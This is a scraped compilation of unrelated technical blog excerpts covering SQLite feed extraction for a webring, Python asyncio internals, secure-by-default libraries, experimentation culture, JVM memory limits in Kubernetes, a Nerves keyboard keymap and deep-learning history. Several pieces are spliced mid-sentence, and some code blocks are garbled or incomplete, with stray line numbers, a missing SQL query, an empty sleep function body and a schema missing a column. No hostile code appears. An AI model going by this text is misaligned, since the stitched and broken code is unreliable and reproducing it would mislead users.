</blockquote>
<h2 id="identifying-the-data-location">Identifying the data location</h2>
<p>Next up was finding out what to take out of the database.
For openring to work, links to the RSS feeds of the respective sites are needed.
Let’s take a look inside the database.</p>

</div>
</div><p>So to find our feeds, the logical conclusion would be to look sinde the <code>feeds</code> table.</p>
<div><div>

</code></pre></td></tr></tbody></table>
</div>
</div><p>Bingo!
Next, I want to only export feeds from blogs that I directly want to link upon, since it’s a quasi endorsement and also webrings are about distribution and decentralisation, so no need to link to hackernews.
For that I created a category called <code>blog-export</code>.
The <code>categories</code> table looks as follows.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3

CREATE TRIGGER on_delete_category_trigger
	AFTER DELETE ON categories
	BEGIN
		DELETE FROM feed_mapping WHERE feed_mapping.category_id<span>=</span>OLD.category_id;
	END;
</code></pre></td></tr></tbody></table>
</div>
</div><p>Lastly, how do we connect a category to a feed?
My first bet was the <code>feed_mapping</code> table, and I was right.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4

<pre><code data-lang="sh">sqlite&gt; .schema feed_mapping
CREATE TABLE feed_mapping <span>(</span>

	category_id TEXT NOT NULL REFERENCES categories<span>(</span>category_id<span>)</span>,
	PRIMARY KEY <span>(</span>feed_id, category_id<span>)</span>
<span>)</span>;
</code></pre></td></tr></tbody></table>
</div>
</div><p>With all pieces together, let’s construct a query which extracts all rss feed URLs from our <code>blog-export</code> category.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1

</div><p>Beautiful!</p>

<p>I poured all this knowledge into a <a href="https://github.com/Milchdealer/teraku.de/tree/main/scripts/openring_from_news-flash.py">python script</a> which basically runs this query and then starts the <code>openring</code> program, using the feeds as arguments.
I added it to my <a href="https://github.com/Milchdealer/teraku.de/tree/main/scripts/deploy.sh">deployment script</a>, which I run to update my blog, and the result you can see below. 🤓</p>

      <h3 id="introduction">Introduction</h3>

<p>Because breaking tasks into pieces and scheduling to run them asynchronously introduce runtime overheads, if the asynchronous program does not have too much I/O time to be saved from <code>asyncio</code>, the performance of executing those tasks asynchronously will be worse than executing those tasks synchronously. This means asynchronous I/O is the most important part of single-thread asynchronous application.</p>



<p>The question is how does <code>asyncio</code> save I/O time? A quick metaphor will be as follows. I have a candy factory and there are three production lines producing candies one by one. The candies from the production line will drop to the ground at the end of the production line, but dropping the candies to the ground will contaminate the candies. Unfortunately, I only got one worker to collect candies into the box. What’s his best strategy to collect as many candies as possible? Typically, he could have two strategies.</p>

<ul>
  <li>Collecting candies at one production line at one time.</li>
  <li>Placing a box at the end of each production line. Rotating between the production lines from time to time and collecting the candies from the boxes.</li>
</ul>

<p>Obviously, smart people will choose the second strategy. Basically, this first strategy is the single-thread synchronous application, and the second strategy is the single-thread asynchronous application.</p>



<p>In this blog post, I would like to discuss the asynchronous of IO for Python asynchronous programming using <code>asyncio</code>.</p>

<h3 id="asynchronous-sleep">Asynchronous Sleep</h3>

<p>A common I/O-bound task includes the <code>sleep</code> function. Using the synchronous and blocking <code>time.sleep</code>, we would have to wait and be blocked for whatever seconds we specified before it is returned.</p>



<p>In <code>asyncio</code>, we also have an asynchronous version of the <code>sleep</code> coroutine function, <code>asyncio.sleep</code>. By scheduling the coroutine to the event loop, during the sleep duration, we are not blocked from doing something else. Here is how <a href="https://github.com/python/cpython/blob/3.8/Lib/asyncio/tasks.py#L638"><code>asyncio.sleep</code></a> is implemented.</p>

<div><div><pre><code><span>async</span> <span>def</span> <span>sleep</span><span>(</span><span>delay</span><span>,</span> <span>result</span><span>=</span><span>None</span><span>,</span> <span>*</span><span>,</span> <span>loop</span><span>=</span><span>None</span><span>):</span>

</code></pre></div></div>

<p>Surprisingly, it is very simple. We create a <code>Future</code> and use a <code>callback</code> to set the value for this <code>Future</code> after some sleep duration <code>delay</code>. Once the result of <code>Future</code> got set, the sleep is over. During the the sleep duration <code>delay</code>, the event loop could schedule some other <code>callbacks</code> to do other tasks. It should be noted that such sleep duration is not precise in practice, due to the nature of event loop scheduling. For instance, if somehow the event loop scheduled a <code>callback</code> that takes extremely long to finish during the sleep duration, the actual sleep time would be much longer than what we were expecting. For example,</p>

</code></pre></div></div>

<p>In this particular example, if we first schedule asynchronous sleep and then schedule a block execution, the finish of sleep has to wait until the the block execution finishes. This is also because the callback scheduling is sophisticated and not smart. Not sure if it is theoretically possible to have a smart event loop implementation.</p>

<h3 id="asynchronous-read">Asynchronous Read</h3>

<p>Although we have seen how <code>sleep</code> is scheduled asynchronously in the event loop, this does not help us understand how other IO-bounded tasks were scheduled very much. For example, if a server receives messages from multiple clients, how does it schedule the <code>callback</code>s asynchronously?</p>



<p>This is a simple server that could asynchronously reading messages from and sending messages to multiple clients asynchronously.</p>

<p>The documentation of <code>asyncio.start_server</code> says “The <code>client_connected_cb</code> callback is called whenever a new client connection is established. It receives a (reader, writer) pair as two arguments, instances of the <code>StreamReader</code> and <code>StreamWriter</code> classes.” Therefore, the connection to the server is not blocking, allowing multiple clients connecting to the sever. If the connection were synchronous and blocking, only one connection could be established.</p>



<p>The data reading and writing to the streams have to be asynchronous as well. Different clients use different sockets in the same port. Each file from the client sent to the server socket will have an <code>EOF</code> (end-of-file), which is an indication of the end of transfer. If the data reading and writing is synchronous, the network connection between the server and one client is poor, even if the file being transferred is small, it might take a long time to receive the <code>EOF</code>, thus blocking the entire thread.</p>



<p>Using the asynchronous <a href="https://github.com/python/cpython/blob/3.8/Lib/asyncio/streams.py#L643"><code>StreamReader.read</code></a> method, we could switch between the multiple connections to the clients. Let’s check how it is achieved.</p>



<p>When we start an server, a <code>StreamReader</code> will be created and a <code>StreamReaderProtocol</code> will wrap the the <code>StreamReader</code>.</p>

<div><div><pre><code><span>async</span> <span>def</span> <span>start_server</span><span>(</span><span>client_connected_cb</span><span>,</span> <span>host</span><span>=</span><span>None</span><span>,</span> <span>port</span><span>=</span><span>None</span><span>,</span> <span>*</span><span>,</span>

    <span>"""Start a socket server, call back for each client connected.
    The first parameter, `client_connected_cb`, takes two parameters:
    client_reader, client_writer.  client_reader is a StreamReader
    object, while client_writer is a StreamWriter object.  This
    parameter can either be a plain callback function or a coroutine;
    if it is a coroutine, it will be automatically converted into a
    Task.
    The rest of the arguments are all the usual arguments to
    loop.create_server() except protocol_factory; most common are
    positional host and port, with various optional keyword arguments
    following.  The return value is the same as loop.create_server().
    Additional optional keyword arguments are loop (to set the event loop
    instance to use) and limit (to set the buffer limit passed to the
    StreamReader).
    The return value is the same as loop.create_server(), i.e. a
    Server object which can be used to stop the service.

<p>“If you could wave a magic wand and do anything to reduce vulnerabilities, what would you do?”</p>
<p>Some common answers are things like training and education, forcing penetration testing, better tools, and smarter users, but none of these things really strike at the core of the issue. Where is the vulnerability garden? Where are those vulnerabilities planted? Can we make that soil hostile to vulnerabilities and rich for good coding practices?</p>
<p>We can. The answer is to make it as hard as possible to introduce vulnerabilities in the first place. The best way to accomplish that is to provide developers libraries, frameworks, defaults, and wrappers so that every developer finds it easy to <a href="https://blog.codinghorror.com/falling-into-the-pit-of-success/">Fall Into The Pit of Success</a> .</p>
<p>Choosing better frameworks that have good ORMs (fewer SQLi), templating engines (fewer XSS), authentication systems, and other security controls can massively reduce the likelihood of a vulnerability. You can mitigate entire classes of vulnerabilities through these good choices.</p>
<p>A security team can take this to the next level by selecting great libraries that are secure by default, by setting secure defaults through settings or policy, and by creating wrappers for existing libraries to instill security best practices into existing libraries.</p>
<p>The <strong>critical</strong> point to this, though, is that you must make it easier to do the secure thing than the insecure thing. If you ask developers to meet you half way or to adopt a new way that takes more time, you will fail. Developers want to build secure software, but they have massive pressure to deliver on features and hit deadlines. The pressure to ship and generate revenue will almost always win out over spending the time and money necessary to create more secure software. This is the real world after all.</p>
<p>Make it easy, let them fall into the pit of success.</p>

<p><em>If you want to get a competitive edge, building a culture of experimentation is critical. It can result in cost savings, higher revenue, and improved user experience.&nbsp;</em></p>


<p>People have been building scientific and technological innovations through testing and experimentation for centuries.&nbsp;</p>


<p>Eratosthenes measured the circumference of Earth 2,000 years ago.&nbsp;</p>


<p>Newton's prism experiment proved color is an inherent property of light itself.&nbsp;</p>


<p>Marie Curie, using an instrument called electrometer, found that radioactivity is an inherent property of individual atoms that emanates from their internal structure.</p>


<p>These experiments have paved the way for modern medicine, geography, energy, communication, physics, etc.&nbsp;</p>


<p>In today's technological world, experimentation holds the same power when it comes to innovation.&nbsp;</p>


<p>Some of the biggest companies, like Amazon, Netflix, and Google, use this scientific method to challenge the status quo. In return, they innovate, grow, and improve.</p>


<p>Amazon CEO, Jeff Bezos, has said: “Our success at Amazon is a function of how many experiments we do per year, per month, per week, per day.”</p>


<p>Mark Zuckerberg has reported that the company conducts thousands of experiments at any given time.</p>


<p>As far back as 2008, Google was already leveraging its search engine users to simultaneously conduct 50–200 experiments.</p>


<p>The end goal of this "test everything" mentality? To roll out new products, get past the competition, improve customer experience, and try new business models.&nbsp;</p>





<h2 id="why-an-experimentation-culture-is-valuable">Why an Experimentation Culture is Valuable</h2>


<p>Only a decade ago, Yahoo was on a par with Google. The two tech giants were competing fiercely to conquer the territory of the World Wide Web. But Google's ferocious experimentation led the company on a path of continuous improvement. Today, Google has a market share of 92.17%, Bing has 2.78%, and Yahoo has 1.6%.</p>


<p>But not all experiments yield successful innovations.&nbsp;</p>


<p>At Google and Bing, about <a href="https://hbr.org/2017/09/the-surprising-power-of-online-experiments" target="_blank" rel="noreferrer noopener">10% to 20% of controlled experiments</a> have positive results. One-third of experiments at Microsoft prove effective, one-third have neutral results, and one-third have negative results.</p>


<p>But that capability to test out everything to see what works and what doesn't has given these companies a competitive edge.&nbsp;</p>


<p>Experimentation has helped Bing make dozens of monthly improvements, which collectively have boosted revenue per search by 10% to 25% a year.&nbsp;</p>


<p>When Facebook tested a secondary "Explore" Feed to its primary News Feed in six countries that let users discover content that they haven't explored yet, it resulted in a 60-80% engagement rate.</p>


<p>To sum up: although experimentation may scare you with its tiny success rate, the benefits can help a company iterate quickly, fail fast, and pivot.&nbsp;</p>


<h2 id="how-to-build-an-experimentation-culture">How to Build an Experimentation Culture</h2>


<p>Successful innovation requires building a culture of experimentation at a company-level. A culture of experimentation involves nurturing employees' curiosity, listening to data, allowing everyone to conduct or commission a test, and managers accepting a new model of leadership.&nbsp;</p>


<h3 id="a-culture-of-experimentation-starts-with-accepting-failure">A Culture of Experimentation Starts With Accepting Failure</h3>


<p>"Failure and invention are inseparable twins." It's what Jeff Bezos says. And he's a smart man.</p>


<p>Building a culture of experimentation starts with the engineering manager accepting that failure will happen, but that shouldn't be an obstacle to continue experimenting.</p>


<p>Instead, failure should be viewed as an inherent and integral part of the learning process.&nbsp;</p>


<p>When leaders accept it as such, it will send a message to the entire company that failure isn't something to be dreaded or scared of. It means the company is learning, growing, and with each experiment, it's closer to achieving its goals.&nbsp;</p>


<p>Everyone involved will feel more comfortable giving feedback, sharing ideas, and brainstorming. Creative minds at the company will be unleashed to try big, new, unproven ideas, and at the same time, business executives will get guaranteed results fast.</p>


<h3 id="small-changes-can-generate-huge-benefits">Small Changes Can Generate Huge Benefits</h3>


<p>We'll use one of Microsoft's real-life stories as an example.&nbsp;</p>


<p>In 2008, an employee suggested having a new tab automatically open when a user clicks on the Hotmail link, instead of opening in the same tab.&nbsp;</p>


<p>A seemingly small change, but when it was tested on 900,000 users in the UK, the engagement of users who opened Hotmail increased by a whopping 8.9%. In 2010, the company introduced the change to 2.7 million users in the US, and it yielded the same results.&nbsp;</p>


<p>Amazon did a similar thing when it moved its credit card offers from the home page to the shopping cart page. The result? Profits increased by tens of millions of dollars annually.&nbsp;</p>


<p>The lesson in these stories is that there's value in introducing a small change quickly, to a small set of users, in order for your engineers to learn whether you're building the right thing.&nbsp;</p>


<p>Starting small is a better option than polishing a large feature, introducing it to a large user base, only to hear a few weeks or months later that the business goals have not been achieved or that the key metric hasn't changed.&nbsp;</p>


<h3 id="more-experiments-are-better-than-few">More Experiments Are Better Than Few</h3>


<p>Many companies today run tens of thousands of online experiments every year. Out of those tens of thousands of experiments, only a few will be successful.</p>


<p>Although it sounds expensive, it's actually riskier to run only a few experiments per year than a thousand.&nbsp;</p>


<p>When you conduct a large number of experiments, a few will be successful. The success of those few experiments will make the financial costs of a string of failed experiments irrelevant.&nbsp;</p>


<p>On the other hand, if you run only a few experiments annually and none of them prove successful, you'll be left dealing with a substantial financial loss.&nbsp;</p>


<p>Failing is useful because it allows <a href="https://adevait.com/software" target="_blank" rel="noreferrer noopener">software developers</a> to eliminate unfavorable ideas and focus their attention on more-promising solutions.</p>


<div><figure><img src="https://content.adevait.com/wp-content/uploads/2020/08/Experiments-1024x517.png" alt="culture of experimentation"></figure></div>


<h3 id="rely-on-data-not-on-strong-opinions">Rely on Data, Not on Strong Opinions</h3>


<p>Every company has people working there, and people have strong opinions. When results from an experiment clash with strong opinions by a team or employee, make sure the empirical results of your online experiments prevail.&nbsp;</p>


<p>The tale of Ron Johnson when he became the CEO of JC Penney is another great story that carries a lesson.</p>


<p>When Johnson joined the company in 2011, he had a bold new plan in mind: he would use technology to eliminate the need for cashiers, get rid of coupons and clearance racks, and fill the stores with branded pieces.</p>


<p>Almost 17 months later, sales had decreased, significant losses were experienced, and ultimately, Johnson had lost his job.&nbsp;</p>


<p>What happened?</p>


<p>Unfortunately, many managers in the business realm lack sufficient data or relevant experience to lead their business decisions. Many managers also rely more on their intuition than on numbers.</p>


<p>If the experiment tells you that you should remove the green button, you remove the green button.&nbsp;</p>


<p>This doesn't mean that managers shouldn't be listened to on all occasions. When it comes to making strategic decisions that can't be tested, managers' input holds value.</p>


<p>But all things that can be tested in a company should be tested. Experiments can guide managers' decisions and fuel healthy debates. Even if those debates end up in overruling the data, at least the company is conscious of the experiments' results and is making a move that's in the company's best interest.&nbsp;</p>


<div><figure><img src="https://content.adevait.com/wp-content/uploads/2020/08/A-B-testing-1024x676.png" alt="A/B testing culture of experimentation"></figure></div>


<h3 id="keep-the-feedback-coming">Keep the Feedback Coming</h3>


<p><a href="https://adevait.com/software/feedback-for-software-developers" target="_blank" rel="noreferrer noopener">Giving feedback to your software developers</a> can inspire them to do future tasks even better and with higher motivation. It can engage an underperforming individual to improve his/her performance to a higher level.&nbsp;</p>


<p>Feedback is also the only way to ensure an employee doesn't continue making the same mistakes.</p>


<p>The majority of employees are interested in hearing feedback from their managers; however, what they crave for is specific feedback.&nbsp;</p>


<p>Specific feedback is telling your engineer what they're doing right and where there's room for improvement.&nbsp;</p>


<p>For example, instead of saying to your <a href="https://adevait.com/javascript-developers" target="_blank" rel="noreferrer noopener">JavaScript developer</a>, "You could be more proactive," say, "You said you would come up with some ideas for overcoming the issue with <a href="https://adevait.com/software/technical-debt" target="_blank" rel="noreferrer noopener">technical debt</a>, but I still haven’t received anything. Is there some problem?"</p>


<p>One great way of giving feedback is the SBI (Situational, Behavior, Impact) Framework.</p>


<p>The SBI framework outlines a simple structure that you can use to give feedback:</p>


<ol><li><strong>Situation</strong>: define the where and the when of the situation you're referring to.&nbsp;</li><li><strong>Behavior</strong>: describe the specific behavior of the employee in the situation you're referring to.</li><li><strong>Impact</strong>: say how the person's behavior has impacted you or others.</li></ol>


<p>In the long run, this can lead to higher performance, unlike less specific feedback that just informs employees of whether they are performing well.</p>


<h3 id="finally-celebrate-your-wins-and-learn-from-your-failures">Finally, Celebrate Your Wins and Learn From Your Failures</h3>


<p>When an experiment yields a successful innovation, celebrate! Celebrating your successes and giving credit where it is due will motivate others to become a part of the culture of experimentation at your company.&nbsp;</p>


<p>And when you fail, learn from it! Even if it's a failed experiment, failures can steer you in the right direction when you lack answers or people have conflicting opinions about an idea.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><time datetime="2020-08-24T17:35:07.322Z">August 24, 2020</time></span> | <span>6 min read</span></p></div><div><div><div><p>In Kubernetes, scaling applications vertically, that are primarily designed to scale horizontally (i.e. microservices) could be a challenging task. That's especially true for setting the <strong>right resource limits for your pod that is running a JVM application</strong>. In addition, memory management/usage of a JVM application is also an interesting topic, but this article is not about that. If you would like to get familiar with the core concepts of memory handling, heap and GC inside JVM, you should take a look on <a href="https://www.youtube.com/watch?v=bspS-uTK0IM" target="_blank" rel="noreferrer noopener">this comprehensive video</a> first.</p>
<h2><code>-Xms</code>, <code>-Xmx</code> and the problem with them</h2>
<p>As you probably already know, you can set the initial (<code>Xms</code>) and the maximum (<code>Xmx</code>) memory pool allocation for a JVM application with these flags. And they just work fine. For example, if you set <code>-Xms128M</code> and <code>-Xmx256M</code> and you start monitoring your application with <a href="https://visualvm.github.io/" target="_blank" rel="noreferrer noopener">VisualVM</a>, you'll see something like this:</p>
<p><img src="https://akobor.me/assets/blog/kubernetes-jvm-limits/xms_xmx_heap_size.png" alt="Heap size with Xms set"></p>
<p>It seems totally fine, your application requests a minimum of 128MiB of memory, which means that it will be allocated to the heap right after the application starts, and will be limited to 256MiB afterwards. Let's check the overall memory usage of the same Java process (see the highlighted row):</p>
<p><img src="https://akobor.me/assets/blog/kubernetes-jvm-limits/actual_mem_usage.png" alt="Heap size with Xms set"></p>
<p>🙀 Well, that's a bit more than 256MiB... The reason behind this is that <strong>JVM uses memory outside the heap for other purposes as well</strong> (metaspace, code cache, etc.), while <code>Xmx</code> affects only the heap.</p>
<h2>The NOT so happy path with resource limits</h2>
<p>As your resources are limited inside a Kubernetes cluster, you have to be careful when it comes to the allocation of them, since you want to avoid the situation where one pod eats up all your resources, and the others will "starve".</p>
<p>Let's take the following example...</p>
<h3>Setting <code>Xms</code> and <code>Xmx</code> inside a Docker image</h3>
<p>You can pass these flags to your JAR in a Docker image like that:</p>
<pre><code>

<span>ENTRYPOINT</span><span> [<span>"java"</span>, <span>"-Xms128M "</span>, <span>"-Xmx256m"</span>, <span>"-jar"</span>, <span>"your-precious-service-1.0.0.jar"</span>]</span></code></pre>
<p>Alternatively, if you're using <a href="https://github.com/GoogleContainerTools/jib" target="_blank" rel="noreferrer noopener">Jib</a>, you can make it work like this in your <code>build.gradle</code>:</p>
<pre><code>
jib {
    to {
        image = <span>"yourorg/yourimage:tag"</span>
    }
    container {
        environment = [<span>"JAVA_TOOL_OPTIONS"</span>: <span>"-Xms128M -Xmx256M"</span>]
    }
}</code></pre>
<h3>Setting the memory limit in Kubernetes</h3>
<p>If you are not aware of the things described above, you could easily end up with a configuration that will cause regular restarts to your pods due to <a href="https://kubernetes.io/docs/tasks/configure-pod-container/assign-memory-resource/#exceed-a-container-s-memory-limit" target="_blank" rel="noreferrer noopener">OOMKilled</a>.
When it  comes to memory limits, you can set the following parameters in your deplyoment:</p>
<pre><code><span>apiVersion:</span> <span>apps/v1</span>
<span>kind:</span> <span>Deployment</span>
<span>metadata:</span>

<span>spec:</span>
  
  <span>template:</span>
    
    <span>spec:</span>
      <span>containers:</span>
        <span>-</span> <span>image:</span> <span>yourorg/yourimage:tag</span>
          <span>name:</span> <span>your-service</span>
          <span>resources:</span>
            <span>requests:</span>
              <span>memory:</span> <span>128Mi</span> 
            <span>limits:</span>
              <span>memory:</span> <span>256Mi</span> </code></pre>
<p>Let's assume that you set the limits above for your pod, since you've also set the same limits in your Docker image via <code>-Xms</code> and <code>-Xmx</code> flags. Then you deploy your service, it spins up without any issue, you are confident and highly satisfied, so you go to get some sleep. <em>At this point you should make sure that you've also updated your job title on LinkedIn to something like "Kubernetes Evangelist".</em> Next morning you check your pod, just to make sure everything's good, and you see this:</p>
<pre><code>➜  ~ kubectl get po
NAME                              READY   STATUS    RESTARTS   AGE
your-service-5d65667768-qksk6     1/1     Running   56         8h</code></pre>
<p><img src="https://media.giphy.com/media/tu54GM19sqJOw/giphy.gif" alt="Wait, WHAT?!?!?!"></p>
<p>Well, that's not exactly what you would expect, right? You probably already have figured out what happened: as we've seen above, the memory usage of a JVM application is not just about the heap's size, so your pod get OOM killed several times as <strong>your application exceeded the pod's memory limit again and again</strong>. </p>
<h2>The right approach</h2>
<p>First of all: for the sake of example let's assume that your heap size limits inside your image are fine. However, if you want to make sure your application reserves all the heap it will use up-front, you could set <code>Xms = Xmx</code> as a rule of thumb.</p>
<p>Regarding your Kubernetes deployment's resource configuration, to avoid OOM kills you should take the following into account:</p>
<ol>
<li><code>requests != Xms</code> - More precisely, your <code>requests</code> value should be definitely larger than your <code>Xmx</code>, and the difference <strong>depends on your application</strong>. If it's a "simple" microservice, you'll be OK with ~30% in addition, but if it's doing a lot of stuff outside the heap, you should consider providing a much larger value here.</li>
<li><code>limits != Xmx</code> - Again, these values are not interchangeable. Your pod's suggested memory limit depends on a lot of stuff (i.e. the used Java base image is an important factor here), so you have to choose it carefully. It might be a good practice to <strong>make some benchmarks with some stress testing</strong> to see, how much burst it generates in terms of the used memory when your application runs at its peak.</li>
<li>Setting a reasonably higher <code>limits</code> initially is always a good practice. If it turns out that you've set it to an unnecessarily high value, you can decrease it whenever you want, without risking a constant pod eviction due to OOM errors.</li>
</ol>
<p>To stick to the concrete case we described above: setting <code>requests</code> to ~320MiB and <code>limits</code> to ~512MiB would be a good start with the given <code>Xms</code> and <code>Xmx</code> values.</p>
<p><em>Generally speaking, the above suggestions could be useful, but the best strategy for setting resource limits in Kubernetes is to <strong>know your application's memory usage</strong>, because there is no formula that can be applied to every situation, since every application is unique.</em></p>

<small>2020-09-01</small><!-- RSS:2020-09-01T09:15:00Z -->
<p><a href="https://devchat.tv/elixir-mix/emx-102-nerves-powered-mechanical-keyboards-with-chris-dose/">
        Chris Dosé was interviewed</a> by us on Elixir Mix. When he spoke about his work on a Nerves-powered keyboard I knew this was a
    project I wanted to try out. So I dropped into their dev channel, acquired the hardware (thanks for the help) and have done some playing
    around with it.
</p>
<p>
    So what is the draw of a Nerves keyboard? Well, you can program it in Elixir. That's a big one for me personally.
    It also means that compared to a lot of high-level languages driving hardware you have pretty strong performance
    characteristics, resilience and specifically with Nerves a lot of best practices for running embedded hardware.
    It makes managing firmware updates easier, it mitigates corruption on SD cards and lots more. As an Elixir
    developer the pure convenience of customizing the keyboard in my favored language is of course delightful.
</p>
<p>
    This post should help you try it out if you have/get the required hardware. The project is currently using the Keybow
    keypad as a prototyping platform to figure out how things should work while they work on the details of a full
    keyboard and it is a neat little gadget, whatever you want to do with it.</p>
<h2>Getting started</h2>
<p>Requirements to try this:</p>
<ul>
<li>A Keybow kit, with Pi Zero (<a href="https://www.adafruit.com/product/4144">Adafruit</a>)</li>
<li>Micro USB Cable</li>
<li>Micro SD Card</li>
</ul>
<p>To get up and running you should:</p>
<ul>
<li><a href="https://hexdocs.pm/nerves/installation.html">Set up Nerves according to these instructions</a></li>
<li>Follow the <a href="https://github.com/ElixirSeattle/xebow">instructions at the xebow repo</a></li>
</ul>
<p>
    The installation guide might not tell you to go into <code>assets</code> and run <code>npm install</code> but I think
    you have to. I'm not going to tell you how to install Node and NPM because it varies. But you can probably find it <a href="https://nodejs.org/en/download/">around the Node site</a>.
</p>
<p>
    If you reach the point of having burned the firmware to your SD Card, congratulations. We are ready to play.
</p>
<h2>First firmware on the device</h2>
<p>So plug the SD card with your pristine Xebow firmware into the Keybow contraption and plug the Keybow into your
    computer
    with the Micro USB cable. Startup can take a little bit but it should settle into cycling through rainbow colors
    after a
    bit. It should also produce numbers when you poke it (the default keymap is a numpad plus some extras).</p>
<h2>Making changes</h2>
<p>I don't need a single numpad and now I have two of them. Let's make this more useful. Open
    <code>lib/xebow/keyboard.ex</code>
    in your preferred editor.</p>
<p>Replace the default keymap with:</p>
<pre data-file="lib/xebow/keyboard.ex"><span></span>    <span>@keymap</span> <span>[</span>
    <span># THE NAVIGATOR!</span>
    <span>%{</span>
      <span>k001</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:home</span><span>),</span>
      <span>k002</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:h</span><span>),</span>
      <span>k003</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:left</span><span>),</span>
      <span>k004</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:page_down</span><span>),</span>
      <span>k005</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:j</span><span>),</span>
      <span>k006</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:down</span><span>),</span>
      <span>k007</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:page_up</span><span>),</span>
      <span>k008</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:k</span><span>),</span>
      <span>k009</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:up</span><span>),</span>
      <span>k010</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:end</span><span>),</span>
      <span>k011</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:l</span><span>),</span>
      <span>k012</span><span>:</span> <span>AFK.Keycode.Key</span><span>.</span><span>new</span><span>(</span><span>:right</span><span>)</span>
    <span>}</span>
  <span>]</span>
</pre>
<p>And then:</p>
<pre data-file="/">export MIX_TARGET=keybow
mix firmware
mix firmware.gen.script
./upload.sh xebow.local
</pre>
<p>Sometimes the upload process can be finicky. You can always re-burn the firmware to the SD card instead using
    <code>mix firmware.burn</code> instead of the <code>gen.script</code>.</p>
<h2>The navigator</h2>
<p>So with the Keybow on its side, four wide. You'll have this fantastic navigation machine at your disposal.
    Top row are arrows, middle row is VIM navigation or GMail or wherever else the don't-move-your-fingers approach is
    used.
    Bottom row are the extremes of the first row.</p>
<table>
<tbody><tr>
<td>Left</td><td>Down</td><td>Up</td><td>Right</td>
</tr>
<tr>
<td>H</td><td>J</td><td>K</td><td>L</td>
</tr>
<tr>
<td>Home</td><td>PgDn</td><td>PgUp</td><td>End</td>
</tr>
</tbody></table>
<h2>Layers?</h2>
<p>So my plan for the keyboard just filled the entire keypad. But the xebow application supports layers, so you can do
    some
    interesting stuff there. I considered doing a chorded keyboard but I'm terrible at them and decided on this as
    something
    I might actually use. There are plenty of cool things you can do with Layers if you want.</p>
<h2>The Future</h2>
<p>The folks in #nerves-keyboard (on the <a href="https://elixir-slackin.herokuapp.com/">Elixir Slack</a>) are hard at work figuring out a real mechanical keyboard
    schematic
    that should be a very cool thing to own and play with. Most of the conversation in there right now is about PCB's, CAD and hardware layout. They are a welcoming bunch. So enjoy :)</p>

<p> In 2020, we are celebrating the 10-year anniversary of our <a href="http://arxiv.org/abs/1003.0358">publication</a>  <a href="#MLP1">[MLP1]</a> in <em>Neural Computation</em> (2010) on deep multilayer perceptrons trained by plain gradient descent on GPU. Surprisingly, our simple but unusually deep supervised artificial neural network (NN) outperformed all previous methods on the (back then famous) machine learning benchmark MNIST. That is, by 2010, when compute was 100 times more expensive than today, both our <em>feedforward</em> NNs <em>and</em> our earlier <em>recurrent</em> NNs (e.g., <a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%204">CTC-LSTM for connected handwriting recognition</a>) were  able to beat all competing algorithms on important problems of that time. In <a href="http://people.idsia.ch/~juergen/2010s-our-decade-of-deep-learning.html">the 2010s</a>, this deep learning revolution 
quickly spread from Europe to America and Asia. 
</p><hr>


<p>  
Just one decade ago, many thought that deep NNs  
cannot learn much without  unsupervised pre-training,
a technique 
<a href="http://people.idsia.ch/~juergen/deep-learning-miraculous-year-1990-1991.html#Sec.%201">introduced by myself in 1991</a> <a href="#UN0">[UN0-UN3]</a> and later also championed by others, e.g., <a href="#UN4">[UN4-5]</a> <a href="#VID1">[VID1]</a> <a href="#T20">[T20]</a>. In fact, it was
 claimed <a href="#VID1">[VID1]</a>
that <em>"nobody in their right mind would ever suggest"</em>  
to use plain gradient descent through <a href="http://people.idsia.ch/~juergen/who-invented-backpropagation.html">backpropagation</a> <a href="#BP1">[BP1]</a>
(see also <a href="#BPA">[BPA-C]</a> 
 <a href="#BP2">[BP2-6]</a> <a href="#R7">[R7]</a>)
 to train feedforward NNs (FNNs) with many layers of neurons.


</p><p> However, in March 2010, our team with  my outstanding Romanian 
postdoc Dan Ciresan  <a href="#MLP1">[MLP1]</a> 
showed that deep FNNs  
can indeed be trained by plain backpropagation 
 for important applications.  
This neither required <a href="http://people.idsia.ch/~juergen/firstdeeplearner.html">unsupervised pre-training</a>  
nor Ivakhnenko's incremental  layer-wise training of 1965 <a href="#DEEP1">[DEEP1-2]</a>. 
By the standards of 2010, our supervised NN had many layers.
It  set a new performance record <a href="#MLP1">[MLP1]</a> on 
the back then famous and widely used image recognition benchmark called MNIST <a href="#MNI">[MNI]</a>.
This was achieved by greatly accelerating traditional 
multilayer perceptrons on highly parallel 
graphics processing units called GPUs, going beyond the important GPU
work of Jung &amp; Oh (2004) <a href="#GPUNN">[GPUNN]</a>. 
A reviewer called this a 
<a href="http://people.idsia.ch/~juergen/handwriting.html">"wake-up call to the machine learning community."</a>

</p><p> Our results set the stage for the recent <a href="http://people.idsia.ch/~juergen/2010s-our-decade-of-deep-learning.html">decade of deep learning</a> <a href="#DEC">[DEC]</a>. In February 2011, our team extended the approach to deep Convolutional NNs (CNNs) <a href="#GPUCNN1">[GPUCNN1]</a>. This 
greatly improved earlier work
 <a href="#GPUCNN">[GPUCNN]</a>.  
The so-called <em>DanNet</em>
<a href="#GPUCNN1">[GPUCNN1]</a> <a href="#R6">[R6]</a> broke several benchmark records.
In May 2011, <em>DanNet</em> was
